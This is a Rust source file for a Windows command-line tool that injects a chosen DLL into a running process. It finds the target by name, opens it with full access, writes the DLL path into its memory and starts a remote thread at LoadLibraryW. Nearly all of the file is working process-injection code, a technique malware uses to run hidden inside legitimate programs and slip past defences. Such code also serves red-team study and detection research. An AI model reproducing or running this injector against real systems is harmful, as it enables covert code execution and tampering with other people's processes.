use sysinfo::System;
use std::env::args;
use std::ffi::c_void;
use std::ptr::{null, null_mut};
use windows_sys::{
    core::{w, s},
    Win32::{
        Foundation::{CloseHandle, GetLastError,  HANDLE, FALSE},
        System::{
            Diagnostics::{
                Debug::{WriteProcessMemory},
            },
            Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE},
            Threading::{OpenProcess, CreateRemoteThread, WaitForSingleObject, INFINITE, PROCESS_ALL_ACCESS},
            LibraryLoader::*,
            }
    }
};

fn main() {
    let args : Vec<String> = args().collect();
    if args.len() < 3 {
        println!("{:<40}{:>40}", "PROCESS NAME","PID");

        let process_list = process_list();
        
        for (pid, process) in process_list.processes() {
            println!("{:<40} {:>40}", process.name(), pid);
        }

        println!("[ ! ] How to use: processinjection.exe <process name> <dll full path>");

        std::process::exit(0);
    }

    unsafe {
        let h_process = open_process(&args);

        // Find LoadLibraryW address

        let p_loadlibraryw_address = GetProcAddress(
            GetModuleHandleW(w!("kernel32.dll")), 
            s!("LoadLibraryW")
        );

        // Allocating memory for DLL path

        let dll_path_size = &args[2].len() * size_of::<u16>();
        let dll_name = &args[2].encode_utf16().collect::<Vec<u16>>();

        let p_address = VirtualAllocEx(
            h_process, 
            null_mut(), 
            dll_name.len() * size_of::<u16>(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
            );

        
        // Write DLL path in process allocated memory
        let mut bytes_written : usize = 0;
        if WriteProcessMemory(
            h_process, 
            p_address, 
            dll_name.as_ptr() as *const c_void, 
            dll_name.len() * size_of::<u16>(), 
            &mut bytes_written
        ) == 0 || bytes_written != dll_path_size {
            println!("[ + ] WriteProcessMemory Failed With Error : {}", GetLastError());
            std::process::exit(0);
        }

        // Create Remote Thread for executing Dll
        let h_thread = CreateRemoteThread(
            h_process,
            null(),
            0,
            std::mem::transmute(p_loadlibraryw_address),
            p_address,
            0,
            null_mut()
        );

        if h_thread.is_null() {
            println!("[ + ] CreateRemoteThread Failed With Error : {}", GetLastError());
            std::process::exit(0);
        }

        if h_thread.is_null() {
            println!("[ ! ] CreateRemoteThread Failed With Error : {}", GetLastError());
            std::process::exit(0);
        }

        println!("[ + ] Done!");

        WaitForSingleObject(h_thread, INFINITE);

        CloseHandle(h_thread);
        CloseHandle(h_process);
    }
}

fn process_list() -> System {
    let mut system = System::new_all();
    system.refresh_all();
    system
}

fn open_process(args : &Vec<String>) -> HANDLE {
    // Enumerating process
    let mut process = process_list();
    process.refresh_all();

    // Getting args
    let args: Vec<String> = args.to_vec();

    let target_process = &args[1];


    let mut process_pid = 0;

    for (_pid,process ) in process.processes() {
        if process.name().to_lowercase().to_string() == target_process.to_lowercase().to_string(){
            process_pid = process.pid().into();
            println!("[ + ] Process Found: {} PID {}", process.name(), process.pid());
            break
        }
    }

    if process_pid == 0 {
        println!("[ ! ] Process {} not found, exiting.", target_process);
        std::process::exit(0);
    }

    unsafe {
        // Get Proccess Handle
        let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_pid as u32);

        h_process
    }
}